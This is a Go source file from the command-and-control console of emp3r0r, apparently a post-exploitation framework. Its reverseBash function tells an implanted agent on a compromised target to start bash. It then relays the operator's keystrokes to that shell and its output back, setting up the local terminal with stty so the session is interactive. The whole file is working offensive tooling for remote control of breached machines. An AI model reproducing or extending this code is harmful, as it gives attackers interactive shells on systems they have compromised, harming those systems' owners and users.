package cc

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"

	"github.com/creack/pty"
	"github.com/jm33-m0/emp3r0r/emagent/internal/agent"
)

func reverseBash() {
	// check if stty is installed
	if !IsCommandExist("stty") {
		CliPrintError("stty is not found, wtf?")
		return
	}

	// activate reverse shell in agent
	err := SendCmd("bash", CurrentTarget)
	if err != nil {
		CliPrintError("Cannot activate reverse shell on remote target: ", err)
		return
	}
	defer func() {
		_ = exec.Command("stty", "sane").Run()
		err = agent.CCStream.Close()
		if err != nil {
			CliPrintWarning("Closing reverse shell connection: ", err)
		}
	}()

	go func() {
		for incoming := range RecvAgentBuf {
			os.Stdout.Write(incoming)
		}
	}()

	go func() {
		// send to target
		for outgoing := range SendAgentBuf {
			_, err = agent.CCStream.Write(outgoing)
			if err != nil {
				log.Print("Send to remote: ", err)
			}
		}
	}()

	// set up terminal
	currentWinSize, err := pty.GetsizeFull(os.Stdin)
	if err != nil {
		CliPrintWarning("Cannot get terminal size: %v", err)
	}
	// disable input buffering
	err = exec.Command("stty", "-F", "/dev/tty", "cbreak", "min", "1").Run()
	if err != nil {
		CliPrintError("stty failed: %v", err)
		return
	}
	// do not display entered characters on the screen
	err = exec.Command("stty", "-F", "/dev/tty", "-echo").Run()
	if err != nil {
		CliPrintError("stty failed: %v", err)
		return
	}
	setupTermCmd := fmt.Sprintf("stty rows %d columns %d;reset\n",
		currentWinSize.Rows, currentWinSize.Cols)
	SendAgentBuf <- []byte(setupTermCmd)

	ttyf, err := os.Open("/dev/tty")
	if err != nil {
		CliPrintError("Cannot open /dev/tty: %v", err)
	}
	for {
		// read stdin
		buf := make([]byte, agent.BufSize)
		_, err = ttyf.Read(buf)
		if err != nil {
			CliPrintWarning("Bash read input: %v", err)
		}
		SendAgentBuf <- buf
		if isExit(string(buf)) {
			break
		}
	}

	CliPrintWarning("bash reverse shell exited")
}

func isExit(cmd string) (exit bool) {
	if strings.HasPrefix(cmd, "exit\n") ||
		strings.HasPrefix(cmd, "quit\n") {
		exit = true
	}
	return
}
